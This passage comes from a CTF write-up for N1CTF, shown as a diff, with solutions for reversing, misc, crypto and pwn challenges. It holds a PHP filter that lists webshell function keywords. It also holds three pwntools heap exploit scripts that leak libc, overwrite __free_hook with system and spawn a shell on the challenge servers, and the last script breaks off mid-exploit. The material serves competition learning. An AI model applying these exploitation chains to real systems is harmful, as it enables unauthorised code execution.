+    uint32_t v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], delta=<span class="hljs-number">0x5f3759df</span>, sum=delta*num_rounds;
+    for (i=<span class="hljs-number">0</span>; i &lt; num_rounds; i++) {
+        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + <span class="hljs-type">key</span>[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);
+        sum -= delta;
+        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + <span class="hljs-type">key</span>[sum &amp; <span class="hljs-number">3</span>]);
+    }
+    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;
+}
+int main(){
+        uint64_t v[<span class="hljs-number">5</span>] = {<span class="hljs-number">0x146d16a886dab2be</span>,<span class="hljs-number">0x54f1658f3c9edb52</span>,<span class="hljs-number">0x2a33699d19c12643</span>,<span class="hljs-number">0xc1ce322600cd9e6b</span>,<span class="hljs-number">0</span>};
+        uint32_t k[<span class="hljs-number">4</span>]={<span class="hljs-number">0x67343146</span>,<span class="hljs-number">0x34313146</span>,<span class="hljs-number">0x31314667</span>,<span class="hljs-number">0x67343131</span>};
+
+        for(int i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++) decipher(<span class="hljs-number">0x20</span>,&amp;v[i],k);
+        puts(v); <span class="hljs-comment">// N1CTF{1s__R0P__Tur1n9_c0mpl3t3?}</span>
+}</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="checkin"><a class="header-link" href="#checkin"></a>checkin</h3>
+<p class="img-container"><img src="https://i.imgur.com/9ZiyOxD.png" alt=""></p>
+<h3 id="n1egg---a-waf,-a-world"><a class="header-link" href="#n1egg---a-waf,-a-world"></a>N1EGG - A waf, a world</h3>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+$case = file_get_contents(<span class="hljs-string">'php://input'</span>);
+<span class="hljs-keyword">if</span>(strpos($case,<span class="hljs-string">'eval('</span>)!==<span class="hljs-keyword">false</span>){
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'system('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'assert('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'shell_exec('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'passthru('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'{${'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'extract('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'base64_decode('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'gzuncompress('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'array_map('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'¾¬¬º­«'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'include($'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'`$_POST'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'`$_REQUEST'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'preg_replace('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'"."'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'"^"'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'shell'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">')($'</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(strpos($case, <span class="hljs-string">'mail('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(stripos($case, <span class="hljs-string">'ld('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(stripos($case, <span class="hljs-string">'link('</span>) !== <span class="hljs-keyword">false</span>) {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'webshell'</span>);
+} <span class="hljs-keyword">else</span>{
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'no-webshell'</span>);
+}</code></pre><p>Final Score: 142</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="baby-rsa"><a class="header-link" href="#baby-rsa"></a>Baby RSA</h3>
+<p>Each encrypted number $x$ equal to $(2y+0)^e\ (mod\ N)$ or $(2y+1)^e\ (mod\ N)$, where $y \equiv randint()^2\ (mod\ N)$. Thus, if $2^{-e}x\ (mod\ N)$ is a quadratic residue of $N$, then the original bit is 0; otherwise ,it is 1. Since N is not an odd prime, so the original Euler&#39;s criterion $(a|p)\ =\  a^{\frac{p-1}{2}}(mod\ p)$ cannot be used in this problem. The properties of Jacobi symbol, which is the generalization of Legendre symbol, and law of quadratic reciprocity would help to solve this problem.</p>
+<pre class="hljs"><code>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'./flag.enc'</span>,<span class="hljs-string">'r'</span>)
+l = []
+<span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> f:
+    l.append(int(<span class="hljs-built_in">line</span>[:<span class="hljs-number">-2</span>], <span class="hljs-number">16</span>))
+
+def jacobi(<span class="hljs-keyword">a</span>, n):
+    assert(n &gt; <span class="hljs-keyword">a</span> &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>)
+    t = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span> != <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span> % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
+            <span class="hljs-keyword">a</span><span class="hljs-comment"> //= 2</span>
+            r = n % <span class="hljs-number">8</span>
+            <span class="hljs-keyword">if</span> r == <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> r == <span class="hljs-number">5</span>:
+                t = -t
+        <span class="hljs-keyword">a</span>, n = n, <span class="hljs-keyword">a</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">a</span> % <span class="hljs-number">4</span> == n % <span class="hljs-number">4</span> == <span class="hljs-number">3</span>:
+            t = -t
+        <span class="hljs-keyword">a</span> %= n
+    <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:
+        <span class="hljs-literal">return</span> t
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-literal">return</span> <span class="hljs-number">0</span>
+rev2 = modinv(pow(<span class="hljs-number">2</span>, e, N), N)
+
+ans = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l:
+    <span class="hljs-keyword">if</span> jacobi((i * rev2)%N, N) == <span class="hljs-number">1</span>:
+        ans += <span class="hljs-string">"0"</span>
+    <span class="hljs-keyword">else</span>:
+        ans += <span class="hljs-string">"1"</span>
+
+<span class="hljs-built_in">number</span>.long_to_bytes(int(ans[::<span class="hljs-number">-1</span>], <span class="hljs-number">2</span>))</code></pre><h3 id="guess_ex"><a class="header-link" href="#guess_ex"></a>guess_ex</h3>
+<p>The problem is a modular linear equation where all numbers are mixed with some small error before sending to us:
+$$
+\begin{aligned}
+a&#39; &amp;= a + e_a \
+T&#39; &amp;= T + e_T \
+S  &amp;= U + e_S \
+a \in Z_p \quad T &amp;\in Z_p^d \quad U = a \times T \
+\end{aligned}
+$$</p>
+<p>And we can derive following equation:
+$$
+\begin{aligned}
+a&#39; \times T&#39; - S &amp;= (a + e_a) (T + e_T) - (aT + e_S) \
+                  &amp;= a&#39; e_T + T&#39; e_a - (e_a e_T + e_S)\
+\end{aligned}
+$$</p>
+<p>Now we have a system of linear equations on those error terms. Since those error terms are quite short, we can build a lattice and use LLL to solve the SIS problem:</p>
+<pre class="hljs"><code><span class="hljs-string">"""
+expected ans:  ea  (et ^ d)  (eats ^ d)  (mod ^ d)  -1
+matrix coeff:  T'   a'        1           p         y
+"""</span>
+M = []
+<span class="hljs-keyword">for</span> i, (ti, si) <span class="hljs-keyword">in</span> enumerate(zip(T, S)):
+    lpad = [<span class="hljs-number">0</span>] * i
+    rpad = [<span class="hljs-number">0</span>] * (d - i - <span class="hljs-number">1</span>)
+    yi = (A * ti - si) % P
+    row = [ti] + lpad + [A] + rpad + lpad + [<span class="hljs-number">1</span>] + rpad + lpad + [P] + rpad + [yi]
+    M.append(row)
+
+M = Matrix(M)
+k = M.right_kernel_matrix()
+k = k.LLL()
+sol = k[<span class="hljs-number">0</span>]
+sol = sol * sol[<span class="hljs-number">-1</span>] * <span class="hljs-number">-1</span>
+sol = A - sol[<span class="hljs-number">0</span>]</code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="warmup"><a class="header-link" href="#warmup"></a>Warmup</h3>
+<p>probability of 1/16</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">from</span> pwn import *
+import sys
+import time
+import random
+host = <span class="hljs-string">'47.52.90.3'</span>
+port = <span class="hljs-number">9999</span>
+
+binary = <span class="hljs-string">"./warmup"</span>
+context.binary = binary
+elf = ELF(binary)
+try:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  log.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.system
+  log.success(<span class="hljs-string">"system_off = "</span>+hex(system_off))
+except:
+  log.failure(<span class="hljs-string">"libc not found !"</span>)
+q=<span class="hljs-number">0</span>
+def <span class="hljs-keyword">add</span><span class="bash">(content):
+</span>  global q
+  q+=<span class="hljs-number">1</span>
+  print q
+  r.recvuntil(<span class="hljs-string">"&gt;&gt;"</span>)
+  r.sendline(<span class="hljs-string">"1"</span>)
+  r.recvuntil(<span class="hljs-string">"&gt;&gt;"</span>)
+  r.send(content)
+
+def edit(index,content):
+  r.recvuntil(<span class="hljs-string">"&gt;&gt;"</span>)
+  r.sendline(<span class="hljs-string">"3"</span>)
+  r.recvuntil(<span class="hljs-string">":"</span>)
+  r.sendline(str(index))
+  r.recvuntil(<span class="hljs-string">"&gt;&gt;"</span>)
+  r.send(content)
+
+def remove(index):
+  r.recvuntil(<span class="hljs-string">"&gt;&gt;"</span>)
+  r.sendline(<span class="hljs-string">"2"</span>)
+  r.recvuntil(<span class="hljs-string">":"</span>)
+  r.sendline(str(index))
+  pass
+
+
+if len(sys.argv) == <span class="hljs-number">1</span>:
+  r = process([binary, <span class="hljs-string">"0"</span>], <span class="hljs-keyword">env</span>={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+  <span class="hljs-comment">#r = remote("127.0.0.1" ,4444)</span>
+
+else:
+  r = remote(host ,port)
+
+if __name__ == <span class="hljs-string">'__main__'</span>:
+  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"1"</span>) <span class="hljs-comment"># 0</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"2"</span>) <span class="hljs-comment"># 1</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"3"</span>) <span class="hljs-comment"># 2</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"4"</span>) <span class="hljs-comment"># 3</span>
+</span>  remove(<span class="hljs-number">3</span>)
+  remove(<span class="hljs-number">3</span>)
+  remove(<span class="hljs-number">2</span>)
+  remove(<span class="hljs-number">2</span>)
+  remove(<span class="hljs-number">0</span>)
+  remove(<span class="hljs-number">0</span>)
+  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"\xb0"</span>) <span class="hljs-comment"># 0</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"\xb0"</span>) <span class="hljs-comment"># 2</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>*8 + p64(0xa1)) <span class="hljs-comment"># 3</span>
+</span>  for i in xrange(<span class="hljs-number">3</span>):
+    remove(<span class="hljs-number">0</span>)
+    remove(<span class="hljs-number">0</span>)
+    edit(<span class="hljs-number">2</span>,<span class="hljs-string">"\xc0"</span>)
+    <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>) <span class="hljs-comment"># 0</span>
+</span>    <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>) <span class="hljs-comment"># 4</span>
+</span>    remove(<span class="hljs-number">4</span>)
+    remove(<span class="hljs-number">4</span>)
+  remove(<span class="hljs-number">0</span>)
+  remove(<span class="hljs-number">0</span>)
+  edit(<span class="hljs-number">2</span>,<span class="hljs-string">"\xc0"</span>)
+  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>) <span class="hljs-comment"># 0</span>
+</span>  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>) <span class="hljs-comment"># 4</span>
+</span>  edit(<span class="hljs-number">3</span>,<span class="hljs-string">"D"</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0</span>x51))
+  remove(<span class="hljs-number">1</span>)
+  remove(<span class="hljs-number">1</span>)
+  edit(<span class="hljs-number">3</span>,<span class="hljs-string">"D"</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0</span>xa1))
+  remove(<span class="hljs-number">4</span>)
+  remove(<span class="hljs-number">4</span>)
+  edit(<span class="hljs-number">3</span>,<span class="hljs-string">"D"</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0</span>x51) + p16(<span class="hljs-number">0</span>x3760))
+
+  <span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"A"</span>)
+</span>  <span class="hljs-keyword">add</span><span class="bash">(p64(0xfbad3c80) + p64(0)*3 + <span class="hljs-string">"\x00"</span>)
+</span>  r.recv(<span class="hljs-number">8</span>)
+  libc = u64(r.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0</span>x3ed8b0
+
+  edit(<span class="hljs-number">3</span>,<span class="hljs-string">"sh\x00"</span>)
+  remove(<span class="hljs-number">0</span>)
+  remove(<span class="hljs-number">0</span>)
+  <span class="hljs-keyword">add</span><span class="bash">(p64(libc + 0x3ed8e8))
+</span>  <span class="hljs-keyword">add</span><span class="bash">(p64(libc + 0x3ed8e8))
+</span>  <span class="hljs-keyword">add</span><span class="bash">(p64(libc + 0x4f440))
+</span>  remove(<span class="hljs-number">3</span>)
+  r.sendline(<span class="hljs-string">"ls"</span>)
+
+  r.interactive()
+</code></pre><h3 id="line"><a class="header-link" href="#line"></a>line</h3>
+<pre class="hljs"><code>#!/usr/bin/env python
+# -*- coding: utf<span class="hljs-number">-8</span> -*-
+from pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> <span class="hljs-built_in">random</span>
+host = <span class="hljs-string">'35.235.107.145'</span>
+port = <span class="hljs-number">6699</span>
+
+<span class="hljs-built_in">binary</span> = <span class="hljs-string">"./line"</span>
+context.<span class="hljs-built_in">binary</span> = <span class="hljs-built_in">binary</span>
+elf = ELF(<span class="hljs-built_in">binary</span>)
+<span class="hljs-keyword">try</span>:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.system
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"system_off = "</span>+<span class="hljs-built_in">hex</span>(system_off))
+except:
+  <span class="hljs-built_in">log</span>.failure(<span class="hljs-string">"libc not found !"</span>)
+
+def <span class="hljs-built_in">add</span>(ID,<span class="hljs-built_in">size</span>,content):
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-string">"1"</span>)
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-built_in">str</span>(ID))
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">size</span>))
+  time.sleep(<span class="hljs-number">0.01</span>)
+  r.send(content)
+  pass
+def show(start,end):
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-string">"2"</span>)
+  pass
+  r.recvuntil(start)
+  data = r.recvuntil(end)[:-len(end)]
+  <span class="hljs-keyword">return</span> data
+
+<span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:
+  r = process([<span class="hljs-built_in">binary</span>, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+
+<span class="hljs-keyword">else</span>:
+  r = remote(host ,port)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">8</span>):
+    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>))
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">8</span>):
+    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>,<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>))
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">8</span>):
+    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">0x30</span>,<span class="hljs-number">0x30</span>,<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>))
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"A"</span>)
+  show(<span class="hljs-string">""</span>,<span class="hljs-string">""</span>)
+  r.recvuntil(<span class="hljs-string">"8 : 64 ("</span>)
+  libc = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x3ebc41</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc = {}"</span>.format(<span class="hljs-built_in">hex</span>(libc)))
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">7</span>):
+    <span class="hljs-built_in">add</span>(<span class="hljs-number">0x10</span>+i,<span class="hljs-number">0x10</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">3</span>):
+    <span class="hljs-built_in">add</span>(<span class="hljs-number">0x20</span>+i,<span class="hljs-number">0x40</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"A"</span>)
+  show(<span class="hljs-string">""</span>,<span class="hljs-string">""</span>)
+  r.recvuntil(<span class="hljs-string">"8 : 48 ("</span>)
+  heap = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0xa41</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">"heap = {}"</span>.format(<span class="hljs-built_in">hex</span>(heap)))
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">8</span>):
+    <span class="hljs-built_in">add</span>(<span class="hljs-number">0x40</span>+i,<span class="hljs-number">0x50</span>,<span class="hljs-string">"sh\x00"</span>)
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,p64(libc + <span class="hljs-number">0x3ed8e8</span>))
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">"A"</span>)
+  <span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,p64(libc + <span class="hljs-number">0x4f440</span>))
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-string">"1"</span>)
+  r.recvuntil(<span class="hljs-string">": "</span>)
+  r.sendline(<span class="hljs-string">"1"</span>)
+  time.sleep(<span class="hljs-number">0.1</span>)
+  r.sendline(<span class="hljs-string">"ls"</span>)
+
+  r.interactive()
+
+</code></pre><h3 id="babypwn"><a class="header-link" href="#babypwn"></a>BabyPwn</h3>
+<p>probability of 1/16</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn import *
+
+<span class="hljs-comment">#r = process(["./BabyPwn"])</span>
+r = remote(<span class="hljs-string">"124.156.209.69"</span>, <span class="hljs-number">9999</span>)
+def <span class="hljs-keyword">add</span><span class="bash">(name,size,content):
+</span>    r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"1\x00"</span>)
+    r.sendafter(<span class="hljs-string">":"</span>,name)
+    r.sendafter(<span class="hljs-string">":"</span>,str(size)+<span class="hljs-string">"\x00"</span>)
+    r.sendafter(<span class="hljs-string">":"</span>,content)
+
+def remove(idx):
+    r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"2\x00"</span>)
+    r.sendafter(<span class="hljs-string">":"</span>,str(idx)+<span class="hljs-string">"\x00"</span>)
+
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span>remove(<span class="hljs-number">0</span>)
+remove(<span class="hljs-number">1</span>)
+remove(<span class="hljs-number">0</span>)
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,p64(0x60203d))
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>*3+p64(0)+p64(0x51)+p64(0)+p64(0x602060)+p64(0x602058)+p64(0)*6+p64(0x21))
+</span>remove(<span class="hljs-number">2</span>)
+
+
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0xc0,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span>remove(<span class="hljs-number">3</span>)
+<span class="hljs-comment">#val = int(raw_input(":"),16)</span>
+val = <span class="hljs-number">0</span>xa
+val = val*<span class="hljs-number">0</span>x1000+<span class="hljs-number">0</span>x5dd
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,p16(val))
+</span>remove(<span class="hljs-number">5</span>)
+remove(<span class="hljs-number">4</span>)
+remove(<span class="hljs-number">5</span>)
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
+</span>remove(<span class="hljs-number">2</span>)
+
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"\x00"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span>
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
+</span>remove(<span class="hljs-number">2</span>)
+
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"\x00"</span>*0x33+p64(0xfbad1800)+<span class="hljs-string">"\x00"</span>*0x19)
+</span>r.recvuntil(<span class="hljs-string">":"</span>)
+data = r.recvuntil(<span class="hljs-string">"="</span>)
+libc = u64(data[<span class="hljs-number">8</span>*<span class="hljs-number">8</span>:<span class="hljs-number">9</span>*<span class="hljs-number">8</span>])-<span class="hljs-number">0</span>x3c5600
+print hex(libc)
+
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
+</span>remove(<span class="hljs-number">2</span>)
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span>
+remove(<span class="hljs-number">3</span>)
+remove(<span class="hljs-number">4</span>)
+remove(<span class="hljs-number">3</span>)
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,p64(libc+0x3c4aed))
+</span>
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
+</span>remove(<span class="hljs-number">2</span>)
+<span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>)
